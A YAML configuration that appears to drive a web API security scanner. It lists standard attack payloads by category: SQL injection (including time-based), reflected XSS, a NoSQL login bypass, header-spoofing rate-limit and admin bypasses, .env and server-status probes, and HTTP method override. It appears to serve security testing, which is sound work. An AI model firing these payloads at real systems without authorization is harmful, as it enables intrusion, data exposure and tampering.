attacks:
  # SQL Injection (SQLi)
  - id: "sqli_001"
    category: "SQLi"
    method: "GET"
    target_param: "query"
    payload_value: "' OR 1=1--"
    description: "Basic boolean-based SQLi"

  - id: "sqli_002"
    category: "SQLi"
    method: "GET"
    target_param: "query"
    payload_value: "' OR 'a'='a"
    description: "Basic boolean-based SQLi with quotes"

  - id: "sqli_003"
    category: "SQLi"
    method: "GET"
    target_param: "query"
    payload_value: "admin' --"
    description: "Admin login bypass via SQLi"

  - id: "sqli_004"
    category: "SQLi"
    method: "GET"
    target_param: "query"
    payload_value: "1; WAITFOR DELAY '0:0:5'--"
    description: "Time-based SQLi (SQL Server)"

  - id: "sqli_005"
    category: "SQLi"
    method: "GET"
    target_param: "query"
    payload_value: "1' AND SLEEP(5)--"
    description: "Time-based SQLi (MySQL)"

  # Cross-Site Scripting (XSS)
  - id: "xss_001"
    category: "XSS"
    method: "GET"
    target_param: "query"
    payload_value: "<script>alert(1)</script>"
    description: "Basic reflected XSS"

  - id: "xss_002"
    category: "XSS"
    method: "GET"
    target_param: "query"
    payload_value: "\"><script>alert(1)</script>"
    description: "Break out of attribute XSS"

  - id: "xss_003"
    category: "XSS"
    method: "GET"
    target_param: "query"
    payload_value: "<img src=x onerror=alert(1)>"
    description: "Image tag XSS"

  - id: "xss_004"
    category: "XSS"
    method: "GET"
    target_param: "query"
    payload_value: "javascript:alert(1)"
    description: "Protocol XSS"

  # Broken Object Level Authorization (BOLA) / IDOR
  - id: "bola_001"
    category: "BOLA"
    method: "GET"
    target_param: "path"
    payload_value: "1"
    description: "Sequential ID 1"

  - id: "bola_002"
    category: "BOLA"
    method: "GET"
    target_param: "path"
    payload_value: "2"
    description: "Sequential ID 2"
    
  - id: "bola_003"
    category: "BOLA"
    method: "GET"
    target_param: "path"
    payload_value: "3"
    description: "Sequential ID 3"

  # Authentication Bypass
  - id: "auth_001"
    category: "AuthBypass"
    method: "POST"
    target_param: "body"
    payload_value: "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}"
    description: "NoSQL Injection Auth Bypass"

  - id: "auth_002"
    category: "AuthBypass"
    method: "GET"
    target_param: "header"
    payload_value: "true"
    description: "Header based auth bypass (X-Admin: true)"
    
  # Rate Limit Bypass
  - id: "ratelimit_001"
    category: "RateLimitBypass"
    method: "GET"
    target_param: "header"
    payload_value: "127.0.0.1"
    description: "X-Forwarded-For spoofing"

  - id: "ratelimit_002"
    category: "RateLimitBypass"
    method: "GET"
    target_param: "header"
    payload_value: "8.8.8.8"
    description: "X-Originating-IP spoofing"

  # Information Disclosure
  - id: "info_001"
    category: "InfoDisclosure"
    method: "GET"
    target_param: "path"
    payload_value: ".env"
    description: "Attempt to access .env file"

  - id: "info_002"
    category: "InfoDisclosure"
    method: "GET"
    target_param: "path"
    payload_value: "server-status"
    description: "Apache server status"

  # Method Override
  - id: "method_001"
    category: "MethodOverride"
    method: "POST"
    target_param: "header"
    payload_value: "DELETE"
    description: "X-HTTP-Method-Override to DELETE"

  - id: "method_002"
    category: "MethodOverride"
    method: "POST"
    target_param: "header"
    payload_value: "PUT"
    description: "X-HTTP-Method-Override to PUT"
